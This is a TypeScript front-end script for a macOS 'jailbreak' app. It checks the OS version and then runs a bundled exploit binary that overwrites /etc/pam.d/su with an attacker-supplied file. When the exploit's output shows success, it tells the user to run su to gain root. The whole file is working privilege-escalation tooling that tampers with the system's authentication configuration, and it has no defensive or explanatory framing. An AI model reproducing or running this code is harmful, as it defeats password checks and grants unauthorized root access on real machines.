const { exec } = require('child_process');
const btn = document.getElementById("jbbtn") as HTMLButtonElement;
const footnote = document.getElementById("footnote") as HTMLParagraphElement;
const path = require("path");
const os = require('os');
exec('sw_vers -productVersion', (error: any, stdout: string, stderr: any) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }

    const osversion = stdout.trim();
    console.log("macOS version is "+osversion);
    if (osversion === "12.6.2" || osversion === "12.6.3" || osversion === "13.1" || osversion === "13.2" || osversion == "13.2.1") {
        btn.innerText = "unsupported";
        btn.style.backgroundColor = "#FF0000";
        btn.disabled = true;
        return;
    }
    btn.onclick = () => {
        btn.textContent = "jailbreaking";
        btn.disabled = true;
        btn.style.backgroundColor = "#FFC300";
        exec(path.join(__dirname,"/resources/exploit/switcharoo"+" /etc/pam.d/su "+path.join(__dirname,"/resources/exploit/overwrite_file.bin")), (error: any, stdout: any, stderr: any) => {
            if (error) {
                console.error(`exec error: ${error}`);
                if (stderr.includes("RO mapping was modified")){
                    btn.innerText = "jailbroken"
                    btn.style.backgroundColor = "#32e000"
                    btn.disabled = true
                    footnote.innerHTML = "successfully jailbroke macOS "+osversion+"! Run <strong><code>su</code></strong> in terminal to gain root."
                } else if (stderr.includes("no diff?")){
                    btn.innerText = "jailbroken"
                    btn.style.backgroundColor = "#32e000"
                    btn.disabled = true
                    footnote.innerHTML = "successfully jailbroke macOS "+osversion+"! Run <strong><code>su</code></strong> in terminal to gain root."
                }
            }
        });
    };
});
